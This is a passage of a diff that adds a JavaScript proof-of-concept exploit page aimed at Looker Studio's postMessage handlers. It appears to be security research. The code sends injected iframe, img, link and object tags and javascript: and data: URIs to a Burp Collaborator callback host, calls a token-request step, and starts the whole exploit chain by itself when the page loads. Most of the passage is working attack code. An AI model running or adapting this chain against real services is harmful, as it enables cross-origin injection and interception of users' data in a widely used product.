+        setTimeout(function() {
+            markStep(6, 'done');
+            setProgress(100);
+            if (callback) callback();
+        }, STEP_DELAY);
+    }
+
+    // ========================================================
+    // STEP 7: Reverse Framing - inject attacker iframe INSIDE Looker
+    // ========================================================
+    function triggerReverseFrame(callback) {
+        markStep(7, 'active');
+        setStepLabel('Step 7/7: Reverse Framing - injecting external iframe inside Looker...');
+        setProgress(95);
+
+        var oast = document.getElementById('oastUrl').value || 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
+
+        log('=== STEP 7: REVERSE FRAMING ===', 'critical');
+        log('Target Collaborator: <b>' + oast + '</b>', 'warn');
+
+        /*
+         * VECTOR A: NAVIGATE to external URL
+         * The NAVIGATE handler at line 4500-4502 does:
+         *   - If in /conversation or /datascope path: Angular router navigate + query merge
+         *   - Else: _.lg_Dv(a.Xa, c.payload.url, true, false) which calls $location.url()
+         * External URLs may trigger a full navigation or be interpreted by the router.
+         */
+        sendMsg({
+            type: 'NAVIGATE',
+            payload: { url: oast + '/reverse-frame-navigate' }
+        }, 'REVFRAME:navigate-external');
+
+        /*
+         * VECTOR B: GOOGLE_AUTH_USER_EMAIL with iframe HTML injection
+         * If the email comparison dialog renders via innerHTML/bypassSecurityTrustHtml,
+         * we can inject an iframe that loads inside the Looker Studio DOM.
+         * This means our Collaborator server gets a request FROM the google.com context.
+         */
+        setTimeout(function() {
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: '<iframe src="' + oast + '/reverse-frame-email-iframe" style="width:1px;height:1px;border:0;position:absolute;"></iframe>victim@test.com'
+                }
+            }, 'REVFRAME:email-iframe');
+        }, 400);
+
+        /*
+         * VECTOR C: PROJECT_DETAILS with manifest/git URLs
+         * Stored in app state - if any component fetches these URLs later
+         * (e.g., to display git info, load manifest), it triggers a request
+         * from the Looker Studio domain to our server.
+         */
+        setTimeout(function() {
+            sendMsg({
+                type: 'PROJECT_DETAILS',
+                payload: {
+                    git_repo: oast + '/reverse-frame-git',
+                    git_branch: 'main',
+                    git_service: oast + '/reverse-frame-service'
+                }
+            }, 'REVFRAME:project-details');
+        }, 800);
+
+        /*
+         * VECTOR D: Abuse innerHTML sinks with img/link/script tags
+         * Multiple innerHTML sinks exist with bypassSecurityTrustHtml (_.lg_2e).
+         * If GOOGLE_AUTH_USER_EMAIL or ERROR messages reach those sinks,
+         * resource tags (img, link, script, iframe) will load from our server.
+         */
+        setTimeout(function() {
+            // img tag - simplest, most reliable for proving server-side request
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: '<img src="' + oast + '/reverse-frame-img-tag">'
+                }
+            }, 'REVFRAME:img-tag');
+        }, 1200);
+
+        setTimeout(function() {
+            // link tag - preload to force fetch
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: '<link rel="prefetch" href="' + oast + '/reverse-frame-link-prefetch">'
+                }
+            }, 'REVFRAME:link-prefetch');
+        }, 1600);
+
+        setTimeout(function() {
+            // object/embed tag - alternative to iframe
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: '<object data="' + oast + '/reverse-frame-object" type="text/html" width="1" height="1"></object>'
+                }
+            }, 'REVFRAME:object-tag');
+        }, 2000);
+
+        /*
+         * VECTOR E: Abuse NAVIGATE with javascript: URI or data: URI
+         * If $location.url() or router doesn't filter protocols,
+         * we can inject inline content.
+         */
+        setTimeout(function() {
+            sendMsg({
+                type: 'NAVIGATE',
+                payload: { url: 'javascript:void(document.body.appendChild(document.createElement("iframe")).src="' + oast + '/reverse-frame-js-nav")' }
+            }, 'REVFRAME:js-navigate');
+        }, 2400);
+
+        setTimeout(function() {
+            // data: URI with embedded iframe
+            sendMsg({
+                type: 'NAVIGATE',
+                payload: { url: 'data:text/html,<iframe src="' + oast + '/reverse-frame-data-nav"></iframe>' }
+            }, 'REVFRAME:data-navigate');
+        }, 2800);
+
+        updateTable('7', 'Reverse Framing', 'TESTING',
+            '7 vectors: NAVIGATE external, iframe via email, PROJECT_DETAILS, img/link/object tags, js:/data: URIs');
+
+        setTimeout(function() {
+            markStep(7, 'done');
+            setProgress(100);
+            log('Reverse framing payloads sent. Check Burp Collaborator for callbacks from google.com!', 'critical');
+            if (callback) callback();
+        }, STEP_DELAY + 1500);
+    }
+
+    // ========================================================
+    // FULL CHAIN - sequential with callbacks
+    // ========================================================
+    function sendAllPayloads() {
+        if (chainRunning) {
+            log('Chain already running, ignoring.', 'warn');
+            return;
         }
+        chainRunning = true;
+
+        // Reset UI
+        for (var i = 1; i <= TOTAL_STEPS; i++) markStep(i, '');
+        setProgress(0);
+        googleMessagesReceived = 0;
+        registeredHandlers.clear();
+
+        log('', 'info');
+        log('========================================', 'critical');
+        log('  FULL EXPLOIT CHAIN - AUTO EXECUTION', 'critical');
+        log('========================================', 'critical');
+        log('', 'info');
+
+        loadTarget(function() {
+            // Small extra wait for Looker's Angular to bootstrap and register handlers
+            log('Waiting for Angular bootstrap + handler registration...', 'info');
+            setStepLabel('Waiting for app initialization...');
+
+            setTimeout(function() {
+                sendProbes(function() {
+                    setTimeout(function() {
+                        triggerNavigate(function() {
+                            setTimeout(function() {
+                                triggerProjectDetails(function() {
+                                    setTimeout(function() {
+                                        triggerTokenRequest(function() {
+                                            setTimeout(function() {
+                                                triggerEmailXSS(function() {
+                                                    setTimeout(function() {
+                                                        triggerReverseFrame(function() {
+                                                            finishChain();
+                                                        });
+                                                    }, 500);
+                                                });
+                                            }, 500);
+                                        });
+                                    }, 500);
+                                });
+                            }, 500);
+                        });
+                    }, 500);
+                });
+            }, 3000);
+        });
+    }
+
+    function finishChain() {
+        chainRunning = false;
+        setStepLabel('Chain complete (' + TOTAL_STEPS + ' steps). ' + googleMessagesReceived + ' messages intercepted. Check Collaborator!');
+
+        log('', 'info');
+        log('========================================', 'critical');
+        log('  CHAIN COMPLETE - RESULTS', 'critical');
+        log('========================================', 'critical');
+        log('Messages intercepted from google.com: <b>' + googleMessagesReceived + '</b>', googleMessagesReceived > 0 ? 'success' : 'warn');
+        log('Handler types seen: <b>' + (registeredHandlers.size > 0 ? Array.from(registeredHandlers).join(', ') : 'none yet') + '</b>', 'info');
+        log('', 'info');
+
+        if (googleMessagesReceived > 0) {
+            addFinding('Full chain successful: ' + googleMessagesReceived + ' messages intercepted from Looker Studio via origin trust override', true);
+        } else {
+            addFinding('No google.com messages intercepted yet. Responses may arrive asynchronously - check log.', false);
+        }
+
+        updateTable('*', 'Full Chain', googleMessagesReceived > 0 ? 'CONFIRMED' : 'TESTING',
+            googleMessagesReceived + ' msgs intercepted, ' + registeredHandlers.size + ' handler types');
+    }
+
+    // ========================================================
+    // AUTO-START ON PAGE LOAD
+    // ========================================================
+    log('PoC initialized. Attacker origin: <b>' + ATTACKER_ORIGIN + '</b>', 'info');
+    log('Auto-starting full exploit chain in 1 second...', 'warn');
+    log('', 'info');
+
+    setTimeout(function() {
+        sendAllPayloads();
+    }, 1000);
     </script>
 </body>
-
 </html>
